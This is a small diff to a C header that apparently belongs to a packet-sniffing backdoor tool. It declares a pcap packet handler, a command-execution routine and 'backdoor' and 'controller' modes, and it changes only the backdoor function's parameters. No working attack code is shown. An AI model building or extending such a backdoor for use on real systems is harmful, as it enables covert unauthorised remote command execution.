@@ -84,7 +84,8 @@ struct handler_args
 char **execute_command(const char *command, int *size);
 void got_packet(u_char *args, const struct pcap_pkthdr *header,
                 const u_char *packet);
-void backdoor_mode(const char *decrypted, const struct in_addr address);
+void backdoor_mode(const char *decrypted, const struct in_addr this_ip,
+                const struct in_addr address);
 void controller_mode(const char *decrypted);
 
 #endif
